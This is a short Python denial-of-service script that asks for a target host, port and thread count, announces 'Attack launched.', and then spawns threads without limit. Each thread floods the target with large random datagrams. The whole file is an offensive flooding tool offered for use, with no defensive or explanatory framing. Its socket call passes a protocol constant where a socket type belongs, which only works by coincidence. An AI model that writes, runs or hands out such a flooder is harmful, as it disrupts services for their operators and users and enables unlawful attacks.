# Distributed Denial of Service by Kali
# Protected under MIT License

# Importing modules
import sys
import socket
import time
import random
import threading
import os
import urllib
from time import sleep

def main():
    global host
    global port
    global packets
    global threads
    global punch
    host = str(input("Host : "))
    port = input("Port : ")
    threads = int(input("Threads : "))
    print("Attack launched.")
    attack()

def randsender(host, port, punch):
    global packets
    global threads
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
            sock.sendto(punch, (host, int(port)))
            for y in range(threads):
                sock.sendto(punch, (host, int(port)))
        except socket.error:
            sock.close()

def attack():
    global host
    global port
    global packets
    global threads
    global punch
    socket.gethostbyname(host)
    pack = 20179
    punch = random._urandom(int(pack))
    while True:
        for x in range (threads):
            threading.Thread(target=randsender, args=(host, port, punch)).start()

if __name__ == "__main__":
    main()
# Special thanks and credit to IoTneT